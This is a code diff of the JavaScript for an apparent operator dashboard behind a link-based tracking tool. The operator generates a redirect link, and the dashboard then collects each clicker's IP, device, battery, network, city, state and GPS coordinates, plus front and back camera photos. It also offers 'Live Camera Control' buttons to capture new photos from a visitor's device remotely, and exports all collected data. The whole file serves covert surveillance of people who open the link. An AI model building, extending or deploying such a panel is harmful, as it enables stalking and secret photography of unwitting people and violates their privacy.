@@ -1,42 +1,64 @@
 let socket;
 let currentVisitorId = null;
+let allUsersData = [];
 
+// ============================================
+// SOCKET CONNECTION
+// ============================================
 socket = io();
 
-fetch('/api/visitors')
+fetch('/api/users-data')
     .then(response => {
         if (response.status === 401) {
             window.location.href = '/';
         }
         return response.json();
     })
+    .then(data => {
+        allUsersData = data;
+        loadVisitors();
+        updateStats();
+        displayAllUsers(data);
+        updateUsersStats(data);
+        populateStateFilter(data);
+    })
     .catch(() => {
         window.location.href = '/';
     });
 
 socket.on('visitor-connected', () => {
-    loadVisitors();
-    updateStats();
+    refreshAllData();
     showNotification('🟢 New visitor connected!');
 });
 
 socket.on('visitor-disconnected', () => {
-    loadVisitors();
-    updateStats();
+    refreshAllData();
 });
 
-socket.on('camera-data', (data) => {
-    if (currentVisitorId === data.visitorId) {
-        showVisitorDetails(currentVisitorId);
+socket.on('camera-data', () => {
+    refreshAllData();
+});
+
+socket.on('location-data', () => {
+    refreshAllData();
+});
+
+// ============================================
+// TAB SWITCHING
+// ============================================
+function showTab(tab) {
+    document.getElementById('dashboardTab').style.display = tab === 'dashboard' ? 'block' : 'none';
+    document.getElementById('usersTab').style.display = tab === 'users' ? 'block' : 'none';
+    document.getElementById('tabDashboard').className = 'tab-btn' + (tab === 'dashboard' ? ' active' : '');
+    document.getElementById('tabUsers').className = 'tab-btn' + (tab === 'users' ? ' active' : '');
+    if (tab === 'users') {
+        refreshAllData();
     }
-});
+}
 
-socket.on('location-data', (data) => {
-    if (currentVisitorId === data.visitorId) {
-        showVisitorDetails(currentVisitorId);
-    }
-});
-
+// ============================================
+// GENERATE LINK
+// ============================================
 function generateCustomLink() {
     const url = document.getElementById('customUrl').value;
     if (!url) {
@@ -56,8 +78,7 @@ function generateCustomLink() {
             document.getElementById('generatedLink').value = data.link;
             document.getElementById('redirectUrlDisplay').textContent = data.redirectUrl;
             showNotification('✅ Link generated successfully!');
-            loadVisitors();
-            updateStats();
+            refreshAllData();
         }
     })
     .catch(error => {
@@ -65,6 +86,27 @@ function generateCustomLink() {
     });
 }
 
+// ============================================
+// REFRESH ALL DATA
+// ============================================
+function refreshAllData() {
+    Promise.all([
+        fetch('/api/users-data').then(r => r.json()),
+        fetch('/api/visitors').then(r => r.json())
+    ])
+    .then(([usersData, visitorsData]) => {
+        allUsersData = usersData;
+        displayAllUsers(usersData);
+        updateUsersStats(usersData);
+        populateStateFilter(usersData);
+        displayVisitors(visitorsData);
+        updateStats();
+    });
+}
+
+// ============================================
+// LOAD VISITORS (Recent)
+// ============================================
 function loadVisitors() {
     fetch('/api/visitors')
         .then(response => response.json())
@@ -76,17 +118,16 @@ function loadVisitors() {
 function displayVisitors(visitors) {
     const container = document.getElementById('visitorsList');
     container.innerHTML = '';
+    const recent = visitors.slice(-10).reverse();
     
-    visitors.forEach(visitor => {
+    recent.forEach(visitor => {
         const card = document.createElement('div');
         card.className = 'visitor-card';
-        
         let locationStr = '';
         if (visitor.location) {
             const loc = visitor.location;
             locationStr = `📍 ${loc.city || ''} ${loc.state || ''} ${loc.country || ''}`;
         }
-        
         card.innerHTML = `
             <div class="visitor-header">
                 <div>
@@ -104,82 +145,252 @@ function displayVisitors(visitors) {
                 </span>
             </div>
             <div style="margin-top:10px;">
-                <button onclick="showVisitorDetails('${visitor.id}')" class="camera-btn">📊 View Details</button>
+                <button onclick="showUserDetails('${visitor.id}')" class="camera-btn">📊 View Details</button>
                 <button onclick="deleteVisitor('${visitor.id}')" class="camera-btn delete">🗑️ Delete</button>
             </div>
-            ${visitor.frontCamera ? `<div style="margin-top:10px;"><img src="${visitor.frontCamera}" style="max-width:80px; border-radius:5px;"></div>` : ''}
         `;
         container.appendChild(card);
     });
 }
 
-function showVisitorDetails(visitorId) {
-    currentVisitorId = visitorId;
+// ============================================
+// DISPLAY ALL USERS (Complete Data)
+// ============================================
+function displayAllUsers(users) {
+    const container = document.getElementById('allUsersList');
+    container.innerHTML = '';
+    
+    if (!users || users.length === 0) {
+        container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No users data available yet. Generate a link and share it!</p>';
+        document.getElementById('userCount').textContent = '(0)';
+        return;
+    }
+    
+    document.getElementById('userCount').textContent = `(${users.length} users)`;
+    
+    users.forEach(user => {
+        const card = document.createElement('div');
+        card.className = 'visitor-card';
+        card.id = 'user-' + user.id;
+        
+        let locationStr = '';
+        if (user.location) {
+            const loc = user.location;
+            locationStr = `📍 ${loc.city || ''} ${loc.state || ''} ${loc.country || ''}`;
+        }
+        
+        const visitCount = user.totalVisits || 0;
+        const lastVisit = user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'Never';
+        
+        card.innerHTML = `
+            <div class="visitor-header">
+                <div>
+                    <strong>🆔 ${user.id}</strong>
+                    <div style="font-size:14px; color:#666; margin-top:5px;">
+                        📱 ${user.deviceName || 'Unknown'} 
+                        ${user.ip ? `• 🌐 ${user.ip}` : ''}
+                        ${visitCount > 0 ? `• 🔄 ${visitCount} visits` : ''}
+                        ${lastVisit !== 'Never' ? `• 📅 Last: ${lastVisit}` : ''}
+                    </div>
+                    ${locationStr ? `<div style="font-size:13px; color:#888;">${locationStr}</div>` : ''}
+                    ${user.battery ? `<div style="font-size:13px; color:#888;">🔋 ${user.battery}%</div>` : ''}
+                </div>
+                <span class="status ${user.connected ? 'active' : 'inactive'}">
+                    ${user.connected ? '🟢 Active' : '🔴 Offline'}
+                </span>
+            </div>
+            <div style="display:flex; gap:8px; margin-top:10px; flex-wrap:wrap;">
+                <button onclick="showUserDetails('${user.id}')" class="camera-btn">📊 Full Details</button>
+                <button onclick="deleteVisitor('${user.id}')" class="camera-btn delete">🗑️ Delete</button>
+                ${user.frontCamera ? `<button onclick="downloadPhoto('${user.frontCamera}', 'front-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Front</button>` : ''}
+                ${user.backCamera ? `<button onclick="downloadPhoto('${user.backCamera}', 'back-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Back</button>` : ''}
+                <button onclick="captureVisitorPhoto('both')" class="camera-btn" style="background:#ed8936;">📸 Capture Both</button>
+            </div>
+            <div style="display:flex; gap:10px; margin-top:10px; flex-wrap:wrap;">
+                ${user.frontCamera ? `<img src="${user.frontCamera}" style="max-width:60px; border-radius:5px;">` : ''}
+                ${user.backCamera ? `<img src="${user.backCamera}" style="max-width:60px; border-radius:5px;">` : ''}
+            </div>
+            ${visitCount > 1 ? `<div style="margin-top:8px; font-size:12px; color:#888;">📋 ${visitCount} total visits. Click "Full Details" for history.</div>` : ''}
+        `;
+        container.appendChild(card);
+    });
+}
+
+// ============================================
+// UPDATE USERS STATS
+// ============================================
+function updateUsersStats(users) {
+    document.getElementById('totalUsers').textContent = users.length;
+    
+    let totalVisits = 0;
+    const uniqueStates = new Set();
+    let activeNow = 0;
+    
+    users.forEach(user => {
+        totalVisits += (user.totalVisits || 0);
+        if (user.location && user.location.state) {
+            uniqueStates.add(user.location.state);
+        }
+        if (user.connected) {
+            activeNow++;
+        }
+    });
+    
+    document.getElementById('totalVisitsAll').textContent = totalVisits;
+    document.getElementById('uniqueLocations').textContent = uniqueStates.size;
+    document.getElementById('activeNow').textContent = activeNow;
+}
+
+// ============================================
+// POPULATE STATE FILTER
+// ============================================
+function populateStateFilter(users) {
+    const states = new Set();
+    users.forEach(user => {
+        if (user.location && user.location.state) {
+            states.add(user.location.state);
+        }
+    });
+    
+    const filter = document.getElementById('filterState');
+    const currentValue = filter.value;
+    filter.innerHTML = '<option value="">All States</option>';
+    states.forEach(state => {
+        filter.innerHTML += `<option value="${state}">${state}</option>`;
+    });
+    filter.value = currentValue;
+}
+
+// ============================================
+// SEARCH USERS
+// ============================================
+function searchUsers() {
+    const query = document.getElementById('searchUsers').value.toLowerCase().trim();
+    const stateFilter = document.getElementById('filterState').value;
+    
+    const cards = document.querySelectorAll('#allUsersList .visitor-card');
+    let visibleCount = 0;
+    
+    cards.forEach(card => {
+        const text = card.textContent.toLowerCase();
+        let show = true;
+        
+        if (query && !text.includes(query)) {
+            show = false;
+        }
+        
+        if (stateFilter) {
+            const userState = text.match(/📍\s*([^,]+)/);
+            if (userState && userState[1] && userState[1].trim() !== stateFilter) {
+                show = false;
+            }
+        }
+        
+        card.style.display = show ? 'block' : 'none';
+        if (show) visibleCount++;
+    });
+    
+    document.getElementById('userCount').textContent = `(${visibleCount} users)`;
+}
+
+// ============================================
+// CLEAR FILTERS
+// ============================================
+function clearFilters() {
+    document.getElementById('searchUsers').value = '';
+    document.getElementById('filterState').value = '';
+    searchUsers();
+}
+
+// ============================================
+// SHOW USER DETAILS (Full History)
+// ============================================
+function showUserDetails(userId) {
+    currentVisitorId = userId;
     const container = document.getElementById('detailsContent');
     const detailsDiv = document.getElementById('visitorDetails');
     
-    fetch(`/api/visitor/${visitorId}`)
+    fetch(`/api/visitor/${userId}`)
         .then(response => response.json())
-        .then(visitor => {
+        .then(user => {
             detailsDiv.style.display = 'block';
+            
+            let visitHistoryHTML = '';
+            if (user.visitHistory && user.visitHistory.length > 0) {
+                visitHistoryHTML = '<h4 style="margin-top:15px;">📋 Visit History</h4><div style="max-height:200px; overflow-y:auto;">';
+                user.visitHistory.forEach((visit, index) => {
+                    const visitDate = visit.visitDate ? new Date(visit.visitDate).toLocaleString() : 'N/A';
+                    const visitLoc = visit.location ? `${visit.location.city || ''} ${visit.location.state || ''}` : 'N/A';
+                    visitHistoryHTML += `
+                        <div style="padding:8px; border-bottom:1px solid #eee; font-size:13px;">
+                            <strong>#${index + 1}</strong> 
+                            📅 ${visitDate} 
+                            ${visit.ip ? `• 🌐 ${visit.ip}` : ''}
+                            ${visitLoc !== 'N/A' ? `• 📍 ${visitLoc}` : ''}
+                            ${visit.battery ? `• 🔋 ${visit.battery}%` : ''}
+                            ${visit.frontCamera ? '• 📸 Front ✅' : ''}
+                            ${visit.backCamera ? '• 📸 Back ✅' : ''}
+                        </div>
+                    `;
+                });
+                visitHistoryHTML += '</div>';
+            } else {
+                visitHistoryHTML = '<p style="color:#999;">No visit history available</p>';
+            }
             
             let html = `
                 <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
                     <div>
-                        <h3>👤 Visitor Information</h3>
+                        <h3>👤 User Information</h3>
                         <div class="visitor-details-grid">
-                            <div class="detail-card"><label>🆔 ID</label><div class="value">${visitor.id}</div></div>
-                            <div class="detail-card"><label>📱 Device</label><div class="value">${visitor.deviceName || 'N/A'}</div></div>
-                            <div class="detail-card"><label>🌐 IP Address</label><div class="value">${visitor.ip || 'N/A'}</div></div>
-                            <div class="detail-card"><label>📶 Network</label><div class="value">${visitor.network?.effectiveType || visitor.network?.type || 'N/A'}</div></div>
-                            <div class="detail-card"><label>🔋 Battery</label><div class="value">${visitor.battery || 'N/A'}%</div></div>
-                            <div class="detail-card"><label>📅 First Visit</label><div class="value">${visitor.visitDate ? new Date(visitor.visitDate).toLocaleString() : 'N/A'}</div></div>
-                            <div class="detail-card"><label>🔄 Total Visits</label><div class="value">${visitor.totalVisits || 0}</div></div>
-                            <div class="detail-card"><label>📅 Last Visit</label><div class="value">${visitor.lastVisit ? new Date(visitor.lastVisit).toLocaleString() : 'N/A'}</div></div>
-                            <div class="detail-card"><label>🟢 Status</label><div class="value">${visitor.connected ? 'Online' : 'Offline'}</div></div>
+                            <div class="detail-card"><label>🆔 ID</label><div class="value">${user.id}</div></div>
+                            <div class="detail-card"><label>📱 Device</label><div class="value">${user.deviceName || 'N/A'}</div></div>
+                            <div class="detail-card"><label>🌐 IP Address</label><div class="value">${user.ip || 'N/A'}</div></div>
+                            <div class="detail-card"><label>📶 Network</label><div class="value">${user.network?.effectiveType || user.network?.type || 'N/A'}</div></div>
+                            <div class="detail-card"><label>🔋 Battery</label><div class="value">${user.battery || 'N/A'}%</div></div>
+                            <div class="detail-card"><label>📅 First Visit</label><div class="value">${user.visitDate ? new Date(user.visitDate).toLocaleString() : 'N/A'}</div></div>
+                            <div class="detail-card"><label>🔄 Total Visits</label><div class="value">${user.totalVisits || 0}</div></div>
+                            <div class="detail-card"><label>📅 Last Visit</label><div class="value">${user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'N/A'}</div></div>
+                            <div class="detail-card"><label>🟢 Status</label><div class="value">${user.connected ? 'Online' : 'Offline'}</div></div>
                         </div>
+                        ${visitHistoryHTML}
                     </div>
                     <div>
                         <h3>📍 Location</h3>
-                        ${visitor.location ? `
+                        ${user.location ? `
                             <div class="visitor-details-grid">
-                                <div class="detail-card"><label>🌍 Country</label><div class="value">${visitor.location.country || 'N/A'}</div></div>
-                                <div class="detail-card"><label>🏛️ State</label><div class="value">${visitor.location.state || 'N/A'}</div></div>
-                                <div class="detail-card"><label>🏙️ City</label><div class="value">${visitor.location.city || 'N/A'}</div></div>
-                                <div class="detail-card"><label>📍 Coordinates</label><div class="value">${visitor.location.lat || 'N/A'}, ${visitor.location.lng || 'N/A'}</div></div>
+                                <div class="detail-card"><label>🌍 Country</label><div class="value">${user.location.country || 'N/A'}</div></div>
+                                <div class="detail-card"><label>🏛️ State</label><div class="value">${user.location.state || 'N/A'}</div></div>
+                                <div class="detail-card"><label>🏙️ City</label><div class="value">${user.location.city || 'N/A'}</div></div>
+                                <div class="detail-card"><label>📍 Coordinates</label><div class="value">${user.location.lat || 'N/A'}, ${user.location.lng || 'N/A'}</div></div>
                             </div>
                         ` : '<p style="color:#999;">Location not available</p>'}
                         
                         <h3 style="margin-top:20px;">📸 Photos</h3>
                         <div style="display:flex; gap:20px; flex-wrap:wrap;">
-                            ${visitor.frontCamera ? `
+                            ${user.frontCamera ? `
                                 <div>
                                     <p><strong>Front Camera</strong></p>
-                                    <img src="${visitor.frontCamera}" class="camera-image">
+                                    <img src="${user.frontCamera}" class="camera-image">
                                     <div style="margin-top:5px;">
-                                        <button onclick="downloadPhoto('${visitor.frontCamera}', 'front-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">
-                                            ⬇️ Download
-                                        </button>
+                                        <button onclick="downloadPhoto('${user.frontCamera}', 'front-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">⬇️ Download</button>
                                     </div>
                                 </div>
                             ` : '<p style="color:#999;">No front photo</p>'}
                             
-                            ${visitor.backCamera ? `
+                            ${user.backCamera ? `
                                 <div>
                                     <p><strong>Back Camera</strong></p>
-                                    <img src="${visitor.backCamera}" class="camera-image">
+                                    <img src="${user.backCamera}" class="camera-image">
                                     <div style="margin-top:5px;">
-                                        <button onclick="downloadPhoto('${visitor.backCamera}', 'back-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">
-                                            ⬇️ Download
-                                        </button>
+                                        <button onclick="downloadPhoto('${user.backCamera}', 'back-camera.jpg')" class="camera-btn" style="background:#48bb78; padding:5px 10px; font-size:12px;">⬇️ Download</button>
                                     </div>
                                 </div>
                             ` : '<p style="color:#999;">No back photo</p>'}
                         </div>
                         
                         <div style="margin-top:20px; border-top:1px solid #ddd; padding-top:15px;">
-                            <h3> Live Camera Control</h3>
-                            <p style="font-size:13px; color:#666; margin-bottom:10px;">Click to capture photo from visitor's device</p>
+                            <h3>📸 Live Camera Control</h3>
                             <div style="display:flex; gap:10px; flex-wrap:wrap; margin-top:10px;">
                                 <button onclick="captureVisitorPhoto('front')" class="camera-btn" style="background:#48bb78;">📷 Capture Front</button>
                                 <button onclick="captureVisitorPhoto('back')" class="camera-btn" style="background:#4299e1;">📷 Capture Back</button>
@@ -194,6 +405,9 @@ function showVisitorDetails(visitorId) {
         });
 }
 
+// ============================================
+// CAPTURE VISITOR PHOTO
+// ============================================
 function captureVisitorPhoto(type) {
     if (!currentVisitorId) {
         alert('Please select a visitor first');
@@ -202,7 +416,7 @@ function captureVisitorPhoto(type) {
     
     const statusDiv = document.getElementById('captureStatus');
     if (statusDiv) {
-        statusDiv.textContent = ` Requesting ${type} photo...`;
+        statusDiv.textContent = `📸 Requesting ${type} photo...`;
         statusDiv.style.color = '#4299e1';
     }
     
@@ -217,11 +431,15 @@ function captureVisitorPhoto(type) {
             statusDiv.style.color = '#22a67e';
         }
         setTimeout(() => {
-            showVisitorDetails(currentVisitorId);
+            showUserDetails(currentVisitorId);
+            refreshAllData();
         }, 2000);
     }, 3000);
 }
 
+// ============================================
+// DOWNLOAD PHOTO
+// ============================================
 function downloadPhoto(imageData, filename) {
     if (!imageData || imageData === 'null' || imageData === 'undefined') {
         alert('No photo to download');
@@ -240,6 +458,9 @@ function downloadPhoto(imageData, filename) {
     }
 }
 
+// ============================================
+// DELETE VISITOR
+// ============================================
 function deleteVisitor(visitorId) {
     if (!confirm('Delete this visitor data?')) return;
     
@@ -248,13 +469,34 @@ function deleteVisitor(visitorId) {
         .then(data => {
             if (data.success) {
                 showNotification('🗑️ Visitor deleted');
-                loadVisitors();
-                updateStats();
+                refreshAllData();
                 document.getElementById('visitorDetails').style.display = 'none';
             }
         });
 }
 
+// ============================================
+// EXPORT ALL DATA
+// ============================================
+function exportAllData() {
+    fetch('/api/users-data')
+        .then(response => response.json())
+        .then(users => {
+            const dataStr = JSON.stringify(users, null, 2);
+            const blob = new Blob([dataStr], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'users-data-' + new Date().toISOString().slice(0,10) + '.json';
+            a.click();
+            URL.revokeObjectURL(url);
+            showNotification('📥 Data exported successfully!');
+        });
+}
+
+// ============================================
+// UPDATE STATS (Dashboard)
+// ============================================
 function updateStats() {
     fetch('/api/visitors')
         .then(response => response.json())
@@ -265,6 +507,9 @@ function updateStats() {
         });
 }
 
+// ============================================
+// COPY LINK
+// ============================================
 function copyLink() {
     const linkInput = document.getElementById('generatedLink');
     linkInput.select();
@@ -272,10 +517,16 @@ function copyLink() {
     showNotification('📋 Link copied!');
 }
 
+// ============================================
+// LOGOUT
+// ============================================
 function logout() {
     window.location.href = '/';
 }
 
+// ============================================
+// SHOW NOTIFICATION
+// ============================================
 function showNotification(message) {
     const existing = document.querySelector('.notification');
     if (existing) existing.remove();
@@ -292,10 +543,10 @@ function showNotification(message) {
     }, 3000);
 }
 
+// ============================================
+// INITIAL LOAD
+// ============================================
 loadVisitors();
 updateStats();
 
-setInterval(() => {
-    loadVisitors();
-    updateStats();
-}, 10000);
+setInterval(refreshAllData, 15000);
